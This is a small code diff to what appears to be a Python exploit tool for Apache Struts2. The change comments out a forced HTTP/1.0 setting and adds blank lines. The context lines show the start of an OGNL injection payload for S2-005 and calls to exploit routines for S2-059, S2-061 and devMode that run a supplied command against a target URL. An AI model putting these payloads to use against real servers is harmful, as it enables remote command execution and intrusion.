@@ -31,7 +31,8 @@ TIMEOUT = 10
 headers = CodeTest.headers
 class ApacheStruts2():
     def __init__(self, url, CMD):
-        http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
+        #指定HTTP/1.0，有可能导致连接中断
+        #http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
         self.url=url
         self.CMD = CMD
         self.payload_s2_005 = r"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.Method" \
@@ -647,3 +648,6 @@ def check(**kwargs):
         ExpApacheStruts2.s2_059()
         ExpApacheStruts2.s2_061()
         ExpApacheStruts2.s2_devMode()
+
+
+
